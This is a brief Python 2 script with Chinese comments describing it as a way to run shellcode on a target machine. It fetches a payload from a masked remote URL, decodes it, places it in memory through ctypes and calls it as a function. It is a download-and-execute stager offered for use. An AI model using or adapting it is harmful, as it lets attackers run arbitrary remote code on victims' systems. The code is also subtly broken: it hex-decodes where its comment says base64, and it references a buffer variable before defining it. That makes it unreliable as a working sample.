#!/usr/bin/env python
#-*- coding:utf-8 -*-
#靶机执行shellcode

import urllib2
import ctypes
import base64

url="http://*******/shellcode.bin"
#下载shellcode
response=urllib2.urlopen(url)

#进行base64解码
shellcode=base64.b16decode(response.read())

#申请内存空间，存入shellcode
shellcode_buffer=ctypes.create_string_buffer(shellcode_buffer,len(shellcode))

#创建shellcode的函数指针
shellcode_func=ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))

#调用函数指针，执行shellcode
shellcode_func()
